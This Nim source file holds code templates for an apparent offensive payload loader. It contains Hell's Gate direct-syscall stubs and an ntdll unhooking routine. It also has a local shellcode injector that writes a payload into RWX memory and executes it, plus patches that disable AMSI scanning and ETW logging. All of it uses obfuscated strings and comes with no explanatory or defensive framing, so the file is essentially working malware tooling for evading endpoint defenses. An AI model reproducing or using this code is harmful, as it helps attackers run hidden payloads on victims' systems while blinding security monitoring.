import strformat
import strutils

let HellsgateAllocDelegate*  = """

proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===


"""

let HellsgateWriteDelegate*  = """


proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

"""

let HellsgateProtectDelegate*  = """


proc NtProtectVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, RegionSize: PSIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

"""

let HellsgateNtCreateThreadExDelegate*  = """

proc NtCreateThreadEx(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

"""

let HellsgateNtCloseDelegate*  = """


proc NtClose(Handle: HANDLE): NTSTATUS {.asmNoStackFrame.} =
    asm ===
        mov r10, rcx
        mov eax, `syscall`
        syscall
        ret
    ===

"""

let HellsgateUnhookStub * = """

from winim import MODULEINFO, GetModuleInformation

proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
      processH = GetCurrentProcess()
      mi : MODULEINFO
      ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    echo obf("Could not map view of file ") & fmt"({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  var status = 0
       
  var 
    ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
    ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)

  var 
    ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
    ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)

  var 
    ntClosefuncHash        : uint64            = djb2_hash(obf("NtClose"))
    ntCloseTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntClosefuncHash)

  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection: DWORD = 0
          var oldProtection2: DWORD = 0
          var bytesWritten: SIZE_T
          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
          if getSyscall(ntProtectTable):              
            syscall = ntProtectTable.wSysCall
          else:
            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
          status = NtProtectVirtualMemory(processH, &ds, &pSize, 0x40, &oldProtection)
          if status != 0:
            echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{GetLastError()}."
            return false
          if getSyscall(ntWriteTable):
            syscall = ntWriteTable.wSysCall
          else:
            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
          status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
          if status != 0:
            echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{GetLastError()}."
            return false
          if getSyscall(ntProtectTable):              
            syscall = ntProtectTable.wSysCall
          else:
            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
          status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
          if status != 0:
            echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{GetLastError()}."
            return false
  if getSyscall(ntCloseTable):              
    syscall = ntCloseTable.wSysCall
  else:
    echo obf("[-] Failed to find opcode for NtClose")
  status = NtClose(processH)
  status = NtClose(ntdllFile)
  status = NtClose(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true


when isMainModule:
  var result = ntdllunhook()
  echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"

"""

let HellsgateLocalInjectStub*  = """
                

proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =

    when defined(amd64):

        let tProcess = GetCurrentProcessId()
        var pHandle: HANDLE = getCurrentProcess()
        
        var 
            ntAllocfuncHash        : uint64            = djb2_hash(obf("NtAllocateVirtualMemory"))
            ntAllocTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntAllocfuncHash)
            status          : NTSTATUS          = 0x00000000
            buffer          : LPVOID
            dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)


        if getSyscall(ntAllocTable):
                
            syscall = ntAllocTable.wSysCall
            status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                
            if not NT_SUCCESS(status):
                echo obf("[-] Failed to allocate memory.")
            else:
                echo obf("[+] Allocated a page of memory with RWX perms")
        else:
            echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

        var 
            ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
            ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
            bytesWritten: SIZE_T

        if getSyscall(ntWriteTable):

            syscall = ntWriteTable.wSysCall
            status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

            if not NT_SUCCESS(status):
                echo obf("[-] Failed to write memory.")
            else:
                echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
                
               
        else:
            echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
            
        let f = cast[proc(){.nimcall.}](buffer)
        f()

when isMainModule:
     pwndemHellsGateLike(dectext)
"""


let HellsgateAMSIPatchStub*  = """

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib(obf("amsi"))
    if isNil(amsi):
        echo obf("[X] Failed to load amsi.dll")
        return disabled

    cs = amsi.symAddr(obf("AmsiScanBuffer")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    
    var oldProtection: DWORD = 0

    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    var pHandle: HANDLE = getCurrentProcess()
        
    var 
        ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
        ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall AMSI patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
        ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
    
    return disabled

when isMainModule:
    success = PatchAmsi()
    echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"


"""

let HellsgateETWPatchStub*  = """

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib(obf("ntdll"))
    if isNil(ntdll):
        echo obf("[X] Failed to load ntdll.dll")
        return disabled

    cs = ntdll.symAddr(obf("EtwEventWrite")) # equivalent of GetProcAddress()
    if isNil(cs):
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var oldProtection: DWORD = 0

    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    let tProcess = GetCurrentProcessId()
    var pHandle: HANDLE = getCurrentProcess()
        
    var 
        ntProtectfuncHash        : uint64            = djb2_hash(obf("NtProtectVirtualMemory"))
        ntProtectTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntProtectfuncHash)
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID


    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[*] Applying Syscall ETW patch")
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")

    var 
        ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
        ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)
        bytesWritten: SIZE_T

    if getSyscall(ntWriteTable):

        syscall = ntWriteTable.wSysCall
        var outLength: SIZE_T
        status = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,patch.len,addr outLength)

        if not NT_SUCCESS(status):
            echo obf("[-] Failed to write memory.")
        else:
            echo obf("[+] NtWriteVirtualMemory Succeed!")
                
               
    else:
        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

    if getSyscall(ntProtectTable):
                
        syscall = ntProtectTable.wSysCall
        status = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            echo obf("[-] Failed to allocate memory.")
        else:
            echo obf("[+] OldProtect set back")
            disabled = true
    else:
        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
    
    return disabled

when isMainModule:
    success = Patchntdll()
    echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"

"""


let HellsgateStub*  = """

import winim/lean as winimport

{.passC:"-masm=intel".}

    #[
        Windows Undocumented Structures - Windows 7+
    ]#

type
    # https://doxygen.reactos.org/d3/d71/struct__ASSEMBLY__STORAGE__MAP__ENTRY.html
    ASSEMBLY_STORAGE_MAP {.pure.} = object
        Flags*      : winimport.ULONG
        DosPath*    : winimport.UNICODE_STRING
        Handle*     : winimport.HANDLE
    PASSEMBLY_STORAGE_MAP* = ptr ASSEMBLY_STORAGE_MAP

    LDR_DLL_LOAD_REASON* {.pure.} = enum
        LoadReasonUnknown                       = -1
        LoadReasonStaticDependency              = 0
        LoadReasonStaticForwarderDependency     = 1
        LoadReasonDynamicForwarderDependency    = 2
        LoadReasonDelayloadDependency           = 3
        LoadReasonDynamicLoad                   = 4
        LoadReasonAsImageLoad                   = 5
        LoadReasonAsDataLoad                    = 6
        LoadReasonEnclavePrimary                = 7
        LoadReasonEnclaveDependency             = 8

    RTL_BALANCED_NODE_STRUCT1* {.pure.} = object
        Left* : PRTL_BALANCED_NODE
        Right* : PRTL_BALANCED_NODE

    RTL_BALANCED_NODE_UNION1* {.pure, union.} = object
        Children* : array[2, PRTL_BALANCED_NODE]
        Struct1*  : RTL_BALANCED_NODE_STRUCT1

    RTL_BALANCED_NODE_UNION2* {.pure, union.} = object
        Red*        {.bitsize:1.}   : winimport.UCHAR
        Balance*    {.bitsize:2.}   : winimport.UCHAR
        ParentValue*                : winimport.ULONG_PTR

    RTL_BALANCED_NODE* {.pure.} = object
        Union1* : RTL_BALANCED_NODE_UNION1
        Union2* : RTL_BALANCED_NODE_UNION2
    PRTL_BALANCED_NODE* = ptr RTL_BALANCED_NODE

    LDR_DATA_TABLE_ENTRY_UNION_ONE* {.pure, union.} = object
        InInitializationOrderLinks*  : winimport.LIST_ENTRY
        InProgressLinks*             : winimport.LIST_ENTRY
    PLDR_DATA_TABLE_ENTRY_UNION_ONE* = ptr LDR_DATA_TABLE_ENTRY_UNION_ONE

    LDR_DATA_TABLE_ENTRY_STRUCT_ONE* {.pure.} = object
        PackagedBinary* {.bitsize:1.}           : winimport.ULONG
        MarkedForRemoval* {.bitsize:1.}         : winimport.ULONG
        ImageDll* {.bitsize:1.}                 : winimport.ULONG
        LoadNotificationSent* {.bitsize:1.}     : winimport.ULONG
        TelemetryEntryProcessed* {.bitsize:1.}  : winimport.ULONG
        ProcessStaticImport* {.bitsize:1.}      : winimport.ULONG
        InLegacyLists* {.bitsize:1.}            : winimport.ULONG
        InIndexes* {.bitsize:1.}                : winimport.ULONG
        ShimDll* {.bitsize:1.}                  : winimport.ULONG
        InExceptionTable* {.bitsize:1.}         : winimport.ULONG
        ReservedFlags1* {.bitsize:2.}           : winimport.ULONG
        LoadInProgress* {.bitsize:1.}           : winimport.ULONG
        LoadConfigProcessed* {.bitsize:1.}      : winimport.ULONG
        EntryProcessed* {.bitsize:1.}           : winimport.ULONG
        ProtectDelayLoad* {.bitsize:1.}         : winimport.ULONG
        ReservedFlags3* {.bitsize:2.}           : winimport.ULONG
        DontCallForThreads* {.bitsize:1.}       : winimport.ULONG
        ProcessAttachCalled* {.bitsize:1.}      : winimport.ULONG
        ProcessAttachFailed* {.bitsize:1.}      : winimport.ULONG
        CorDeferredValidate* {.bitsize:1.}      : winimport.ULONG
        CorImage* {.bitsize:1.}                 : winimport.ULONG
        DontRelocate {.bitsize:1.}              : winimport.ULONG
        CorILOnly* {.bitsize:1.}                : winimport.ULONG
        ChpeImage* {.bitsize:1.}                : winimport.ULONG
        ReservedFlags5* {.bitsize:2.}           : winimport.ULONG
        Redirected* {.bitsize:1.}               : winimport.ULONG
        ReservedFlags6* {.bitsize:2.}           : winimport.ULONG
        CompatDatabaseProcessed* {.bitsize:1.}  : winimport.ULONG

    LDR_DATA_TABLE_ENTRY_UNION_TWO* {.pure, union.} = object
        FlagGroup*   : array[4, winimport.UCHAR]
        Flags*       : winimport.ULONG
        Struct*      : LDR_DATA_TABLE_ENTRY_STRUCT_ONE            
    PLDR_DATA_TABLE_ENTRY_UNION_TWO* = ptr LDR_DATA_TABLE_ENTRY_UNION_TWO
    
    LDR_DATA_TABLE_ENTRY* {.pure.} = object
        InLoadOrderLinks*               : winimport.LIST_ENTRY
        InMemoryOrderLinks*             : winimport.LIST_ENTRY
        Union_1*                        : LDR_DATA_TABLE_ENTRY_UNION_ONE
        DLLBase*                        : winimport.PVOID
        EntryPoint*                     : winimport.PVOID
        SizeOfImage*                    : winimport.ULONG
        FullDllName*                    : winimport.UNICODE_STRING
        BaseDllName*                    : winimport.UNICODE_STRING
        Union_2*                        : LDR_DATA_TABLE_ENTRY_UNION_TWO
        ObsoleteLoadCount               : winimport.USHORT
        TlsIndex*                       : winimport.USHORT
        HashLinks*                      : winimport.LIST_ENTRY
        TimeDateStamp*                  : winimport.ULONG
        EntryPointActivationContext*    : winimport.PVOID
        Lock*                           : winimport.PVOID
        DdgagNode*                      : winimport.PVOID       # PLDR_DDAG_NODE
        NodeModuleLink*                 : winimport.LIST_ENTRY
        LoadContext*                    : winimport.PVOID       # PLDRP_LOAD_CONTEXT
        ParentDllBase                   : winimport.PVOID
        SwitchBackContext*              : winimport.PVOID
        BaseAddressIndexNode*           : RTL_BALANCED_NODE
        MappingInfoIndexNode*           : RTL_BALANCED_NODE
        OriginalBase*                   : winimport.ULONG_PTR
        LoadTime*                       : winimport.LARGE_INTEGER
        BaseNameHashValue*              : winimport.ULONG
        LoadReason*                     : LDR_DLL_LOAD_REASON
        ImplicitPathOptions*            : winimport.ULONG
        ReferenceCount*                 : winimport.ULONG
        DependentLoadFlags*             : winimport.ULONG
        SigningLevel*                   : winimport.UCHAR
    PLDR_DATA_TABLE_ENTRY* = ptr LDR_DATA_TABLE_ENTRY

    PEB_LDR_DATA* {.pure.} = object
        Length*                             : winimport.ULONG
        Initialized*                        : winimport.BOOLEAN
        SsHandle*                           : winimport.PVOID
        InLoadOrderModuleList*              : winimport.LIST_ENTRY
        InMemoryOrderModuleList*            : winimport.LIST_ENTRY
        InInitializationOrderModuleList*    : winimport.LIST_ENTRY
        EntryInProgress*                    : winimport.PVOID
        ShutdownInProgress*                 : winimport.BOOLEAN
        ShutdownThreadId*                   : winimport.HANDLE
    PPEB_LDR_DATA* = ptr PEB_LDR_DATA

    PEB* {.pure.} = object
        InheritedAddressSpace*                  : winimport.BOOLEAN
        ReadImageFileExecOptions*               : winimport.BOOLEAN
        BeingDebugged*                          : winimport.BOOLEAN
        PebUnion1*                              : winimport.UCHAR
        Padding0*                               : array[4, winimport.UCHAR]
        Mutant*                                 : winimport.HANDLE
        ImageBaseAddress*                       : winimport.PVOID
        Ldr*                                    : PPEB_LDR_DATA                             
        ProcessParameters*                      : winimport.PRTL_USER_PROCESS_PARAMETERS  
        SubSystemData*                          : winimport.PVOID                         
        ProcessHeap*                            : winimport.HANDLE                        
        FastPebLock*                            : winimport.PVOID          # PRTL_CRITICAL_SECTION
        AtlThunkSListPtr*                       : winimport.PVOID                         
        IFEOKey*                                : winimport.PVOID                         
        PebUnion2*                              : winimport.ULONG                         
        Padding1*                               : array[4, winimport.UCHAR]               
        KernelCallBackTable*                    : ptr winimport.PVOID                     
        SystemReserved*                         : winimport.ULONG                         
        AltThunkSListPtr32*                     : winimport.ULONG                         
        ApiSetMap*                              : winimport.PVOID                         
        TlsExpansionCounter*                    : winimport.ULONG                         
        Padding2*                               : array[4, winimport.UCHAR]               
        TlsBitmap*                              : winimport.PVOID                         
        TlsBitmapBits*                          : array[2, winimport.ULONG]               
        ReadOnlyShareMemoryBase*                : winimport.PVOID                         
        SharedData*                             : winimport.PVOID                         
        ReadOnlyStaticServerData*               : ptr winimport.PVOID                     
        AnsiCodePageData*                       : winimport.PVOID                         
        OemCodePageData*                        : winimport.PVOID                         
        UnicodeCaseTableData*                   : winimport.PVOID                         
        NumberOfProcessors*                     : winimport.ULONG                         
        NtGlobalFlag*                           : winimport.ULONG                         
        CriticalSectionTimeout*                 : winimport.LARGE_INTEGER                 
        HeapSegmentReserve*                     : winimport.ULONG_PTR                     
        HeapSegmentCommit*                      : winimport.ULONG_PTR                     
        HeapDeCommitTotalFreeThreshold*         : winimport.ULONG_PTR                     
        HeapDeCommitFreeBlockThreshold*         : winimport.ULONG_PTR                     
        NumberOfHeaps*                          : winimport.ULONG                         
        MaximumNumberOfHeaps*                   : winimport.ULONG                         
        ProcessHeaps*                           : ptr winimport.PVOID                     
        GdiSharedHandleTable*                   : winimport.PVOID                         
        ProcessStarterHelper*                   : winimport.PVOID                         
        GdiDCAttributeList*                     : winimport.ULONG                         
        Padding3*                               : array[4, winimport.UCHAR]               
        LoaderLock*                             : winimport.PVOID           # PRTL_CRITICAL_SECTION
        OSMajorVersion*                         : winimport.ULONG
        OSMinorVersion*                         : winimport.ULONG
        OSBuildNumber*                          : winimport.USHORT
        OSCSDVersion*                           : winimport.USHORT
        OSPlatformId*                           : winimport.ULONG
        ImageSubsystem*                         : winimport.ULONG
        ImageSubsystemMajorVersion*             : winimport.ULONG
        ImageSubsystemMinorVersion*             : winimport.ULONG
        Padding4                                : array[4, winimport.UCHAR]
        ActiveProcessAffinityMask*              : winimport.PVOID            # KAFFINITY
        GdiHandleBuffer                         : array[0x3c, winimport.ULONG]
        PostProcessInitRoutine*                 : winimport.VOID
        TlsExpansionBitmap*                     : winimport.PVOID
        TlsExpansionBitmapBits*                 : array[0x20, winimport.ULONG]
        SessionId*                              : winimport.ULONG
        Padding5*                               : array[4, winimport.UCHAR]
        AppCompatFlags*                         : winimport.ULARGE_INTEGER
        AppCompatFlagsUser*                     : winimport.ULARGE_INTEGER
        ShimData*                               : winimport.PVOID
        AppCompatInfo*                          : winimport.PVOID
        CSDVersion*                             : winimport.UNICODE_STRING
        ActivationContextData*                  : winimport.PVOID             # PACTIVATION_CONTEXT_DATA 
        ProcessAssemblyStorageMap*              : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
        SystemDefaultActivationContextData*     : winimport.PVOID             # PACTIVATION_CONTEXT_DATA
        SystemAssemblyStorageMap*               : winimport.PVOID             # PASSEMBLY_STORAGE_MAP
        MinimumStackCommit*                     : winimport.ULONG_PTR
        Sparepointers*                          : array[4, winimport.PVOID]
        SpareUlongs*                            : array[5, winimport.ULONG]
        WerRegistrationData*                    : winimport.PVOID
        WerShipAssertPtr*                       : winimport.PVOID
        Unused*                                 : winimport.PVOID
        ImageHeaderHash*                        : winimport.PVOID
        TracingFlags*                           : winimport.ULONG
        CsrServerReadOnlySharedMemoryBase*      : winimport.ULONGLONG
        TppWorkerpListLock*                     : winimport.ULONG
        TppWorkerpList*                         : winimport.LIST_ENTRY
        WaitOnAddressHashTable*                 : array[0x80, winimport.PVOID]
        TelemtryCoverageHeader*                 : winimport.PVOID
        CloudFileFlags*                         : winimport.ULONG
        CloudFileDiagFlags*                     : winimport.ULONG
        PlaceholderCompatabilityMode*           : winimport.CHAR
        PlaceholderCompatabilityModeReserved*   : array[7, winimport.CHAR]
        LeapSecondData*                         : winimport.PVOID
        LeapSecondFlags*                        : winimport.ULONG
        NtGlobalFlag2*                          : winimport.ULONG
    PPEB* = ptr PEB

    TEB* {.pure.} = object
        NtTib*                                  : winimport.NT_TIB
        EnvironmentPointer*                     : winimport.PVOID
        ClientId*                               : winimport.CLIENT_ID
        ActiveRpcHandle*                        : winimport.PVOID
        ThreadLocalStoragePointer*              : winimport.PVOID
        ProcessEnvironmentBlock*                : PEB
        LastErrorValue*                         : winimport.ULONG
        CountOfOwnedCriticalSections*           : winimport.ULONG
        CsrClientThread*                        : winimport.PVOID
        Win32ThreadInfo*                        : winimport.PVOID
        User32Reserved*                         : array[0x1A, winimport.ULONG]
        UserReserved*                           : array[5, winimport.ULONG]
        WOW32Reserved*                          : winimport.PVOID
        CurrentLocale*                          : winimport.ULONG
        FpSoftwareStatusRegister*               : winimport.ULONG
        ReservedForDebuggerInstrumentation*     : array[0x10, winimport.PVOID]
    PTEB* = ptr TEB





var syscall*  : WORD
type
    HG_TABLE_ENTRY* = object
        pAddress*    : PVOID
        dwHash*      : uint64
        wSysCall*    : WORD
    PHG_TABLE_ENTRY* = ptr HG_TABLE_ENTRY

proc djb2_hash*(pFuncName : string) : uint64 =

    var hash : uint64 = 0x5381

    for c in pFuncName:
        hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))

    return hash

proc moduleToBuffer*(pCurrentModule : PLDR_DATA_TABLE_ENTRY) : PWSTR =
    return pCurrentModule.FullDllName.Buffer

proc flinkToModule*(pCurrentFlink : LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    return cast[PLDR_DATA_TABLE_ENTRY](cast[ByteAddress](pCurrentFlink) - 0x10)

proc getExportTable*(pCurrentModule : PLDR_DATA_TABLE_ENTRY, pExportTable : var PIMAGE_EXPORT_DIRECTORY) : bool =

    let 
        pImageBase : PVOID              = pCurrentModule.DLLBase
        pDosHeader : PIMAGE_DOS_HEADER  = cast[PIMAGE_DOS_HEADER](pImageBase)
        pNTHeader : PIMAGE_NT_HEADERS = cast[PIMAGE_NT_HEADERS](cast[ByteAddress](pDosHeader) + pDosHeader.e_lfanew)

    if pDosheader.e_magic != IMAGE_DOS_SIGNATURE:
        return false

    if pNTHeader.Signature != cast[DWORD](IMAGE_NT_SIGNATURE):
        return false

    pExportTable = cast[PIMAGE_EXPORT_DIRECTORY](cast[ByteAddress](pImageBase) + pNTHeader.OptionalHeader.DataDirectory[0].VirtualAddress)

    return true

proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_DIRECTORY, tableEntry : var HG_TABLE_ENTRY) : bool =

    var 
        cx : DWORD = 0
        numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
    let 
        pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
        pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
        pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)

    while cx < numFuncs:    
        var 
            pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
            pFuncName       : string    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
            funcHash        : uint64    = djb2_hash(pFuncName)
            funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
            pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
        
        if funcHash == tableEntry.dwHash:

            tableEntry.pAddress = pFuncAddr
            if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]

            return true
        inc cx
    return false

proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
    asm ===
        mov rax, qword ptr gs:[0x60]
        ret
    ===

proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
    flink = flink.Flink[]
    return flinkToModule(flink)

proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
    var 
        currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
        currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
        moduleName      : string
        pExportTable    : PIMAGE_EXPORT_DIRECTORY
    let 
        beginModule = currModule
    
    while true:

        moduleName = $moduleToBuffer(currModule)

        if moduleName.len() == 0 or moduleName in paramStr(0):            
            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
            continue

        if not getExportTable(currModule, pExportTable):
            echo obf("[-] Failed to get export table...")
            return false

        if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
            return true
        
        currModule = getNextModule(currFlink)
        if beginModule == currModule:
            break
    return false

proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
    
    let currentPeb  : PPEB = GetPEBAsm64()
       
    if not searchLoadedModules(currentPeb, tableEntry):
        return false

    return true

"""

